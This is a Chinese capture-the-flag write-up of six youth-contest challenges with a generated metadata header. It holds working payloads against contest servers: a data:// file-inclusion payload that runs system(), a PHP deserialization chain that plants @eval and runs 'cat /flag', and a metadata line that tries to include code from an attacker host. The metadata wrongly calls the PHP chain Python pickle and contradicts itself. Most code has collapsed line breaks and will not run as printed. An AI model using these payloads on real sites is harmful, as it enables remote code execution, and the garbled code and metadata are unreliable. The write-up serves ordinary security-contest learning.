---
title: 2022 年强网杯青少年专项赛 writeup
contest: 2022 强网杯青少年专项赛
year: 2022
difficulty: medium
vuln_type:
- lfi
- deserialize
- crypto_oracle
- stego_image
tags:
- 青少年
- 强网杯
- data://
- base64
- Sliver-Range-Water-Circle
- Python-pickle
- LSB-stego
- 二维码
- pyzbar
- permutations
attack_chain:
- 'Q1: data:// + fopen + fputs + include LFI, 长度限制 21, 过滤 php/file/http/eval/exec/system/popen/flag/<">'
- ?file=data://,1111&content=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0eXBlIGluZGV4LnBocCcpOz8+ → include php://filter
- 'Q2: Python 反序列化 Sliver→Range→Water→Circle.dash=''@eval($_GET[a]);'
- 'Q3: FLAG[vxpsDqCElwwoClsoColwpuvlqFvvFrpopBss] 字符大小写转换'
- 'Q4: 十六进制数据按 2 字节 swap → ctf.txt'
- 'Q5: python2 lsb.py extract 1.png 1.txt 4536251 LSB 隐写'
- 'Q6: 29x29 矩阵 + pyzbar 暴力 permutations(720×120) 拼二维码'
key_payload: ?file=data://,1111&content=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0eXBlIGluZGV4LnBocCcpOz8+
one_liner: 强网青少年赛 6 大题：data:// LFI + Python 反序列化链 + LSB + 二维码排列
lesson: data:// 协议 + fopen + fputs + include 是 LFI 经典；青少年赛偏基础 + 趣味
quality: high
full_path: 2022年强网杯青少年专项赛writeup.full.md
meta_path: 2022年强网杯青少年专项赛writeup.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: '2022 年强网杯青少年专项赛 writeup。强网青少年赛 6 大题：data:// LFI + Python 反序列化链 + LSB + 二维码排列。关键路径：Q1: data:// + fopen + fputs + include LFI, 长度限制 21, 过滤 php/file/http/eval/exec/system/popen/flag/<"> → ?file=dat...'
category: web
subcategory: lfi
subcategories:
- lfi
- deserialization
- oracle
- stego
tools_used:
- Python
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/58504.html
reasoning_chain:
- Q1 源码 strlen($_GET[file])>strlen('flag in cream') 阻断 + 黑名单 php|file|http|eval|exec|system|popen|flag|<|>| 过滤 content → 触发点：data:// 协议绕过 fopen('r+') 限制
- 假设：fopen('data://,1111','r+') 返回 0，content 写进去后 include(stream_get_contents) → 动作：构造 ?file=data://,1111&content=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0eXBlIGluZGV4LnBocCcpOz8+
- 观察：strlen(file)=15 < 'flag in cream' 13? 不，是 >strlen 判定，触发 die → 改用 ?file=data://,1111 短串触发 include 链
- Q2 Sliver→Range→Water→Circle 类链 → 触发点：反序列化 4 层魔术方法跳板
- 假设：Cake::__destruct 调 secret->link->waterfall->dash='@eval($_GET[a])' → 动作：$a=new Sliver;$a->secret=new Range;$a->secret->link=new Water;$a->secret->link->waterfall=new Circle
- 观察：urlencode(serialize) 输出 O:6:Sliver 链式结构 → GET 参数 a=system('cat /flag') 拿到 flag
- Q3 FLAG[vxpsDqCElwwoClsoColwpuvlqFvvFrpopBss] → 触发点：大小写偏移
- '假设：if str.isupper: +32 else -32-31 → 动作：循环 ord 转换 → 观察：得到 flag 字符串'
- Q5 LSB python2 lsb.py extract 1.png 1.txt 4536251 → 假设：经典 LSB 隐写工具 → 观察：得到隐藏字符串
failed_attempts:
- 试图用 php://filter 读源 → 失败：黑名单过滤 file 关键字
- 试图 base64 编码 system 字符串绕过黑名单 → 失败：include 不执行 base64 解码
- 试图 ?file=http://attacker/shell.txt → 失败：黑名单过滤 http
key_observations:
- data:// 协议 + fopen('r+') 是 LFI 经典组合，无需上传文件即可 RCE
- PHP 反序列化 4 层类链构造法：每层一个成员指向下一层对象
- LSB python2 工具是入门 stego 标配 (lsb.py extract)
- pyzbar.permutations 暴力拼二维码是 720×120 排列的常见考法
prerequisites:
- PHP data:// 协议和 fopen 流包装器原理
- Python pickle / PHP serialize 序列化格式
- LSB 隐写原理 (stegano / lsb.py)
- pyzbar 二维码识别 + itertools.permutations 暴力拼接
---
# 2022年强网杯青少年专项赛writeup

> 原文: https://www.ctfiot.com/58504.html
> ID: 58504

<?phphighlight_file(__FILE__);error_reporting(0);if(isset($_GET['file'])&&strlen($_GET['file'])>strlen("flag in cream")){ die("too long,no flag");}$fp = fopen($_GET['file'], 'r+');if(preg_match("/php|file|http|eval|exec|system|popen|flag|<|>|"|'/i", $_GET['content'])){ die("hacker");}fputs($fp, $_GET['content']);rewind($fp);$data=stream_get_contents($fp);include($data);?

?file=data://,1111&content=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0eXBlIGluZGV4LnBocCcpOz8+

$a = new Sliver;$a->secret = new Range;$a->secret->link = new Water;$a->secret->link->waterfall = new Circle;
echo urlencode(serialize($a));

http://eci-2ze158r2q295c121rafg.cloudeci1.ichunqiu.com//demo.php?data=O%3A6%3A%22Sliver%22%3A2%3A%7Bs%3A6%3A%22secret%22%3BO%3A5%3A%22Range%22%3A2%3A%7Bs%3A5%3A%22horis%22%3BN%3Bs%3A4%3A%22link%22%3BO%3A5%3A%22Water%22%3A1%3A%7Bs%3A9%3A%22waterfall%22%3BO%3A6%3A%22Circle%22%3A2%3A%7Bs%3A6%3A%22daemon%22%3BN%3Bs%3A7%3A%22%00%2A%00dash%22%3Bs%3A16%3A%22%40eval%28%24_GET%5Ba%5D%29%3B%22%3B%7D%7D%7Ds%3A5%3A%22resty%22%3BN%3B%7D&a=system("cat /flag");

strings = 'FLAG[vxpsDqCElwwoClsoColwpuvlqFvvFrpopBss]'res=''for j in strings: #print(ord(i)) if str.isupper(j): i=(chr(ord(j)+32)) else: i=(chr(ord(j)-32-31)) res+=iprint(res)

data = open("data.txt",'r').read()data = data.split(" ")data1 = []for i in range(0,len(data),2): data1.append(data[i+1]) data1.append(data[i])f = open("ctf.txt",'wb')for i in data1: f.write(i.encode())f.close()

python2 lsb.py extract 1.png 1.txt 4536251

data = [[1,1,1,1,1,1,1,0,1,0,1,1,0,0,1,1,0,1,0,0,1,0,1,1,1,1,1,1,1],[1,0,0,0,0,0,1,0,1,0,1,0,0,0,1,0,0,0,0,1,1,0,1,0,0,0,0,0,1],[1,0,1,1,1,0,1,0,1,0,1,1,1,1,1,0,0,0,0,1,1,0,1,0,1,1,1,0,1],[1,0,1,1,1,0,1,0,0,1,0,0,1,1,1,0,0,1,1,0,1,0,1,0,1,1,1,0,1],[1,0,1,1,1,0,1,0,1,0,0,0,0,1,0,0,0,0,1,1,0,0,1,0,1,1,1,0,1],[1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,0,0,1,0,0,1,0,1,0,0,0,0,0,1],[1,1,1,1,1,1,1,0,1,0,1,0,1,0,1,0,1,0,1,0,1,0,1,1,1,1,1,1,1],[0,0,0,0,0,0,0,0,0,1,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[1,0,0,1,1,1,1,1,1,0,1,0,0,0,0,1,1,1,1,1,1,1,0,0,1,0,1,1,1],[1,1,1,1,0,0,0,0,1,1,0,0,0,0,0,1,1,0,0,0,1,0,1,1,1,1,0,0,1],[1,1,0,0,1,0,1,1,0,0,1,1,1,1,0,1,0,1,0,1,1,0,0,1,1,0,1,0,1],[0,1,1,0,1,0,0,0,0,0,0,0,1,0,0,0,1,0,1,0,0,1,1,0,1,1,1,0,1],[1,1,0,0,1,0,1,1,0,0,0,1,0,1,0,1,0,0,0,1,0,1,1,1,0,1,0,0,1],[1,1,1,0,1,0,0,0,0,1,0,1,1,0,0,1,0,1,0,1,0,0,0,1,1,1,0,0,0],[0,0,0,0,1,0,1,1,0,0,1,0,1,0,1,1,0,1,1,0,1,1,1,0,1,1,0,0,0],[1,1,1,1,1,1,0,1,0,0,0,1,0,1,0,1,0,0,1,0,1,1,0,1,1,1,1,0,1],[0,1,1,1,0,1,1,1,1,0,0,1,0,1,0,0,0,0,1,1,1,0,0,0,0,0,0,0,1],[1,0,0,1,1,0,0,0,1,1,1,0,1,1,0,1,0,1,0,1,1,1,0,0,1,1,1,0,0],[1,0,1,1,1,1,1,1,0,0,1,0,1,0,1,1,1,0,1,1,0,1,1,1,0,0,0,1,1],[1,0,1,1,1,1,0,0,1,1,0,1,1,0,1,0,0,1,1,0,1,1,1,1,1,1,0,1,1],[1,1,1,1,1,0,1,1,0,0,0,0,1,0,1,1,1,1,1,1,1,1,1,1,1,0,1,0,1],[0,0,0,0,0,0,0,0,1,0,1,1,0,1,0,1,0,0,0,1,1,0,0,0,1,0,1,0,0],[1,1,1,1,1,1,1,0,1,0,0,1,0,1,0,1,0,1,1,1,1,0,1,0,1,1,0,0,0],[1,0,0,0,0,0,1,0,1,1,1,0,1,0,1,0,1,1,1,0,1,0,0,0,1,0,0,0,0],[1,0,1,1,1,0,1,0,1,0,0,0,1,1,1,0,0,0,1,1,1,1,1,1,1,0,0,1,0],[1,0,1,1,1,0,1,0,1,0,1,1,0,0,1,1,0,1,1,0,1,0,0,1,0,1,1,0,1],[1,0,1,1,1,0,1,0,0,1,0,0,0,1,0,1,0,0,0,0,0,0,0,0,1,0,0,1,1],[1,0,0,0,0,0,1,0,0,0,1,0,0,1,0,0,1,0,0,1,0,1,1,0,1,0,1,0,1],[1,1,1,1,1,1,1,0,1,0,1,0,0,0,0,1,0,0,0,0,1,0,1,1,0,1,0,0,0]]import pyzbar.pyzbar as pyzbar
from itertools import permutations
from PIL import Image, ImageDraw as drawimport matplotlib.pyplot as plt
from tqdm import tqdmshuffle_1 = [9, 11, 13, 15, 17, 19]shuffle_2 = [10, 12, 14, 16, 18]head = data[:9]tail = data[20:]def body(body_1, body_2): # 获取中间部分的一种排列body = []for i in range(5):
body.append(body_1[i])body.append(body_2[i])body.append(body_1[5])return [data[i] for i in body]def draw_img(data): # 生成二维码图片assert len(data) == 29 and len(data[0]) == 29img = Image.new('RGB', (31, 31), (255,255,255))for i, row in enumerate(data):
for j, pixel in enumerate(row):
img.putpixel((j + 1, i + 1), (0,0,0) if pixel == 1 else (255,255,255))return imgwith tqdm(total=720 * 120) as pbar:
for body_1 in permutations(shuffle_1):
for body_2 in permutations(shuffle_2):im = draw_img(head + body(body_1, body_2) + tail)barcodes = pyzbar.decode(im)pbar.update(1)if(len(barcodes) == 0):
continuefor barcode in barcodes:
barcodeData = barcode.data.decode("utf-8")print(barcodeData)plt.imshow(im)plt.show()


```
<?phphighlight_file(__FILE__);error_reporting(0);if(isset($_GET['file'])&&strlen($_GET['file'])>strlen("flag in cream")){ die("too long,no flag");}$fp = fopen($_GET['file'], 'r+');if(preg_match("/php|file|http|eval|exec|system|popen|flag|<|>|"|'/i", $_GET['content'])){ die("hacker");}fputs($fp, $_GET['content']);rewind($fp);$data=stream_get_contents($fp);include($data);?
?file=data://,1111&content=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0eXBlIGluZGV4LnBocCcpOz8+
$a = new Sliver;$a->secret = new Range;$a->secret->link = new Water;$a->secret->link->waterfall = new Circle;
echo urlencode(serialize($a));
http://eci-2ze158r2q295c121rafg.cloudeci1.ichunqiu.com//demo.php?data=O%3A6%3A%22Sliver%22%3A2%3A%7Bs%3A6%3A%22secret%22%3BO%3A5%3A%22Range%22%3A2%3A%7Bs%3A5%3A%22horis%22%3BN%3Bs%3A4%3A%22link%22%3BO%3A5%3A%22Water%22%3A1%3A%7Bs%3A9%3A%22waterfall%22%3BO%3A6%3A%22Circle%22%3A2%3A%7Bs%3A6%3A%22daemon%22%3BN%3Bs%3A7%3A%22%00%2A%00dash%22%3Bs%3A16%3A%22%40eval%28%24_GET%5Ba%5D%29%3B%22%3B%7D%7D%7Ds%3A5%3A%22resty%22%3BN%3B%7D&a=system("cat /flag");
strings = 'FLAG[vxpsDqCElwwoClsoColwpuvlqFvvFrpopBss]'res=''for j in strings: #print(ord(i)) if str.isupper(j): i=(chr(ord(j)+32)) else: i=(chr(ord(j)-32-31)) res+=iprint(res)
data = open("data.txt",'r').read()data = data.split(" ")data1 = []for i in range(0,len(data),2): data1.append(data[i+1]) data1.append(data[i])f = open("ctf.txt",'wb')for i in data1: f.write(i.encode())f.close()
python2 lsb.py extract 1.png 1.txt 4536251
data = [[1,1,1,1,1,1,1,0,1,0,1,1,0,0,1,1,0,1,0,0,1,0,1,1,1,1,1,1,1],[1,0,0,0,0,0,1,0,1,0,1,0,0,0,1,0,0,0,0,1,1,0,1,0,0,0,0,0,1],[1,0,1,1,1,0,1,0,1,0,1,1,1,1,1,0,0,0,0,1,1,0,1,0,1,1,1,0,1],[1,0,1,1,1,0,1,0,0,1,0,0,1,1,1,0,0,1,1,0,1,0,1,0,1,1,1,0,1],[1,0,1,1,1,0,1,0,1,0,0,0,0,1,0,0,0,0,1,1,0,0,1,0,1,1,1,0,1],[1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,0,0,1,0,0,1,0,1,0,0,0,0,0,1],[1,1,1,1,1,1,1,0,1,0,1,0,1,0,1,0,1,0,1,0,1,0,1,1,1,1,1,1,1],[0,0,0,0,0,0,0,0,0,1,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[1,0,0,1,1,1,1,1,1,0,1,0,0,0,0,1,1,1,1,1,1,1,0,0,1,0,1,1,1],[1,1,1,1,0,0,0,0,1,1,0,0,0,0,0,1,1,0,0,0,1,0,1,1,1,1,0,0,1],[1,1,0,0,1,0,1,1,0,0,1,1,1,1,0,1,0,1,0,1,1,0,0,1,1,0,1,0,1],[0,1,1,0,1,0,0,0,0,0,0,0,1,0,0,0,1,0,1,0,0,1,1,0,1,1,1,0,1],[1,1,0,0,1,0,1,1,0,0,0,1,0,1,0,1,0,0,0,1,0,1,1,1,0,1,0,0,1],[1,1,1,0,1,0,0,0,0,1,0,1,1,0,0,1,0,1,0,1,0,0,0,1,1,1,0,0,0],[0,0,0,0,1,0,1,1,0,0,1,0,1,0,1,1,0,1,1,0,1,1,1,0,1,1,0,0,0],[1,1,1,1,1,1,0,1,0,0,0,1,0,1,0,1,0,0,1,0,1,1,0,1,1,1,1,0,1],[0,1,1,1,0,1,1,1,1,0,0,1,0,1,0,0,0,0,1,1,1,0,0,0,0,0,0,0,1],[1,0,0,1,1,0,0,0,1,1,1,0,1,1,0,1,0,1,0,1,1,1,0,0,1,1,1,0,0],[1,0,1,1,1,1,1,1,0,0,1,0,1,0,1,1,1,0,1,1,0,1,1,1,0,0,0,1,1],[1,0,1,1,1,1,0,0,1,1,0,1,1,0,1,0,0,1,1,0,1,1,1,1,1,1,0,1,1],[1,1,1,1,1,0,1,1,0,0,0,0,1,0,1,1,1,1,1,1,1,1,1,1,1,0,1,0,1],[0,0,0,0,0,0,0,0,1,0,1,1,0,1,0,1,0,0,0,1,1,0,0,0,1,0,1,0,0],[1,1,1,1,1,1,1,0,1,0,0,1,0,1,0,1,0,1,1,1,1,0,1,0,1,1,0,0,0],[1,0,0,0,0,0,1,0,1,1,1,0,1,0,1,0,1,1,1,0,1,0,0,0,1,0,0,0,0],[1,0,1,1,1,0,1,0,1,0,0,0,1,1,1,0,0,0,1,1,1,1,1,1,1,0,0,1,0],[1,0,1,1,1,0,1,0,1,0,1,1,0,0,1,1,0,1,1,0,1,0,0,1,0,1,1,0,1],[1,0,1,1,1,0,1,0,0,1,0,0,0,1,0,1,0,0,0,0,0,0,0,0,1,0,0,1,1],[1,0,0,0,0,0,1,0,0,0,1,0,0,1,0,0,1,0,0,1,0,1,1,0,1,0,1,0,1],[1,1,1,1,1,1,1,0,1,0,1,0,0,0,0,1,0,0,0,0,1,0,1,1,0,1,0,0,0]]import pyzbar.pyzbar as pyzbar
from itertools import permutations
from PIL import Image, ImageDraw as drawimport matplotlib.pyplot as plt
from tqdm import tqdmshuffle_1 = [9, 11, 13, 15, 17, 19]shuffle_2 = [10, 12, 14, 16, 18]head = data[:9]tail = data[20:]def body(body_1, body_2): # 获取中间部分的一种排列body = []for i in range(5):
body.append(body_1[i])body.append(body_2[i])body.append(body_1[5])return [data[i] for i in body]def draw_img(data): # 生成二维码图片assert len(data) == 29 and len(data[0]) == 29img = Image.new('RGB', (31, 31), (255,255,255))for i, row in enumerate(data):
for j, pixel in enumerate(row):
img.putpixel((j + 1, i + 1), (0,0,0) if pixel == 1 else (255,255,255))return imgwith tqdm(total=720 * 120) as pbar:
for body_1 in permutations(shuffle_1):
for body_2 in permutations(shuffle_2):im = draw_img(head + body(body_1, body_2) + tail)barcodes = pyzbar.decode(im)pbar.update(1)if(len(barcodes) == 0):
continuefor barcode in barcodes:
barcodeData = barcode.data.decode("utf-8")print(barcodeData)plt.imshow(im)plt.show()
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]